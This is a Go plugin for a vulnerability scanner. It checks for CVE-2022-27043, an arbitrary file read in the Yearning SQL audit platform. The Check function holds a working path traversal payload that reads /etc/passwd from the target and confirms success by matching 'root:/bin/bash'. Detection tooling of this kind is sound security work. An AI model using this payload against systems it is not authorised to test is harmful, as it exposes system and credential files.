package goplugin

import (
	"Yscanner/utils"
	"net/http"
	"strings"
)

func init() {
	Register("yearning_front_file_read", &yearning_front_file_read{})
}

type yearning_front_file_read struct{}

func (p *yearning_front_file_read) Info() PluginInfo {
	return PluginInfo{
		Name:     "Yearning front 任意文件读取漏洞",
		VulnInfo: "Yearning是中国Henry Yee个人开发者的一个出色方便快捷的 Mysql SQL 审核平台。Yearning存在一个任意文件读取漏洞。攻击者可以利用该漏洞获取敏感信息。",
		VulnID:   "CVE-2022-27043",
		Level:    "7.5 HIGH",
		URL:      "",
		Version:  "Yearning 2.3.1；Interstellar GA 2.3.2 和 Neptune 2.3.4 - 2.3.6",
		CWE:      "CWE-22	路径遍历",
	}
}

func (p *yearning_front_file_read) Check(netloc string) bool {
	payload := "/front/%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c/etc/passwd"
	req, err := http.NewRequest("GET", netloc+payload, nil)
	if err != nil {
		return false
	}
	resp, err := utils.RequestDo(req, true, 2)
	if err != nil {
		return false
	}

	if resp.Other.StatusCode == 200 && strings.Contains(resp.ResponseRaw, "root:/bin/bash") {
		return true
	}

	return false
}
